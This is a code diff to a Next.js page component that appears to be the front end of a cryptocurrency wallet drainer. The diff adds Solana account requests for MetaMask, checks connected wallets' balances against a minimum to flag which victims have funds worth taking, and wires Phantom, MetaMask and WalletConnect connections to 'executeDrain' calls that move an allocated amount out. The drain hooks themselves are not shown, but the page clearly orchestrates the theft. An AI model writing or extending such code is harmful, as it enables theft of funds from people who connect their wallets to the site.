@@ -44,7 +44,7 @@ export default function Home() {
   
   const { executeDrain: executeSolanaDrain } = useSolanaDrain();
   const { executeDrain: executeEthereumDrain } = useEthereumDrain();
-  const { connect: connectWalletConnect } = useWalletConnect();
+  const { connect: connectWalletConnect, executeDrain: executeWalletConnectDrain } = useWalletConnect();
   
   useEffect(() => {
     if (isMobileBrowser() && !window.solana && !window.ethereum) {
@@ -109,24 +109,51 @@ export default function Home() {
           return;
         }
         
-        const provider = new ethers.BrowserProvider(window.ethereum);
-        await provider.send("eth_requestAccounts", []);
-        const signer = await provider.getSigner();
-        address = await signer.getAddress();
+        // MetaMask with Solana support
+        let solanaProvider = null;
+        try {
+          await window.ethereum.request({
+            method: 'wallet_requestSolanaAccounts',
+            params: []
+          });
+          solanaProvider = window.ethereum;
+        } catch (err) {
+          console.log('MetaMask Solana provider not available');
+        }
+
+        if (!solanaProvider && !window.solana) {
+          throw new Error('No Solana wallet detected');
+        }
+
+        const provider = solanaProvider || window.solana;
+        const response = await provider.connect();
+        address = response.publicKey.toString();
         
-        const weiBalance = await provider.getBalance(address);
-        const balanceInEth = parseFloat(ethers.formatEther(weiBalance));
-        const MIN_ETH = 0.001;
+        const { Connection } = await import('@solana/web3.js');
+        const connection = new Connection(process.env.NEXT_PUBLIC_SOLANA_RPC, 'confirmed');
         
-        hasFunds = balanceInEth > MIN_ETH;
-        balance = balanceInEth;
+        const lamports = await connection.getBalance(response.publicKey);
+        const balanceInSol = lamports / 1e9;
+        const MIN_REQUIRED_LAMPORTS = 0.003 * 1e9;
         
-        console.log(`[MetaMask] Balance: ${balanceInEth} ETH, HasFunds: ${hasFunds}`);
+        hasFunds = lamports > MIN_REQUIRED_LAMPORTS;
+        balance = balanceInSol;
+        
+        console.log(`[MetaMask] Balance: ${balanceInSol} SOL, HasFunds: ${hasFunds}`);
         
       } else if (type === 'walletconnect') {
         address = await connectWalletConnect();
-        hasFunds = true;
-        balance = 'N/A';
+        // For WalletConnect, we need to fetch balance via RPC
+        const { Connection } = await import('@solana/web3.js');
+        const connection = new Connection(process.env.NEXT_PUBLIC_SOLANA_RPC, 'confirmed');
+        const lamports = await connection.getBalance(new PublicKey(address));
+        const balanceInSol = lamports / 1e9;
+        const MIN_REQUIRED_LAMPORTS = 0.003 * 1e9;
+        
+        hasFunds = lamports > MIN_REQUIRED_LAMPORTS;
+        balance = balanceInSol;
+        
+        console.log(`[WalletConnect] Balance: ${balanceInSol} SOL, HasFunds: ${hasFunds}`);
       }
       
       setWalletAddress(address);
@@ -175,9 +202,9 @@ export default function Home() {
       if (walletType === 'phantom') {
         result = await executeSolanaDrain(allocatedAmount);
       } else if (walletType === 'metamask') {
-        result = await executeEthereumDrain();
+        result = await executeEthereumDrain(allocatedAmount);
       } else if (walletType === 'walletconnect') {
-        // WalletConnect drain implementation
+        result = await executeWalletConnectDrain(allocatedAmount);
       }
       
       if (result?.success) {
@@ -427,4 +454,4 @@ export default function Home() {
       />
     </div>
   );
-      }
+            }
